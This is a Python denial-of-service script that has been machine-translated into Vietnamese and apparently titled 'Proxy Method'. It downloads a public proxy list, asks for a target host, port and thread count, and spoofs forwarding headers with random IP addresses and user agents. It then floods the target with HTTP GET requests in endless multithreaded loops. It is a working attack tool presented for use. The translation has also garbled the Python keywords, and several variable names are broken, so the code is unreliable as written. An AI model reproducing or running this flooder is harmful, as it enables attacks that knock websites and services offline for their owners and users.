# -*- mã hóa: utf-8 -*-
yêu cầu nhập khẩu
nhập ngẫu nhiên
từ fake_useragent nhập UserAgent
nhập luồng
nhập hệ điều hành
os.system('cls||xóa')

inf=1000000000000

randip = ".".join(map(str, (random.randint(0, 255)
												cho _ trong phạm vi (4))))

useragent = UserAgent()
ua = userragent.random

in('''
╔═╗╦═╗╔═╗═╗ ╦╦ ╦ ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗
╠═╝╠╦╝║ ║╔╩╦╝╚╦╝ ║║║║╣ ║ ╠═╣║ ║ ║║
╩ ╩╚═╚═╝╩ ╚═ ╩ ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝
-- IP/URL mục tiêu phải chấp nhận các yêu cầu HTTP --
						  [L4 & L7]
''')


req = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
r = request.get(req)
với open('proxy.txt', 'w') là f:
		f.write(r.text)
		print('Proxy đã được lưu vào proxy.txt trong File')
		print('nếu bạn muốn có proxy tùy chỉnh, hãy thay đổi chúng ngay bây giờ.')
		print("không thêm http://")
		in(" ")

mục tiêu = đầu vào ("Mục tiêu:")
cổng = đầu vào ("Cổng:")
threadcount = input("Chủ đề:")

target = "http://"+target+":"+port

tiêu đề = {
	"X-Forwarded-For":randip,
	"X-Origin-IP":randip,
	"X-Remote-IP":randip,
	"X-Remote-Addr":randip,
	"Tác nhân người dùng":ua,
	"Ngôn ngữ chấp nhận": "en-US,en;q=0.5",
	"Kết nối": "Keep-Alive"
}

proxyraw = [line.rstrip('\n') cho dòng đang mở("proxy.txt")]
def httpget():
	cho tôi trong phạm vi (1, inf):
		cố gắng:
				proxy = random.choice(proxyraw)
				proxy = {
						"http": "http://"+proxy
				}
				request.get(mục tiêu, tiêu đề=tiêu đề, proxy=proxies)
				in (proxy)
		ngoại trừ Ngoại lệ như e:
				in(e)

def threader():
		chủ đề toàn cầu
		chủ đề = []
		cho tôi trong phạm vi (int (số luồng)):
				t=luồng.Thread(đích=httpget)
				thread.append(t)
				t.start()
máy xâu ()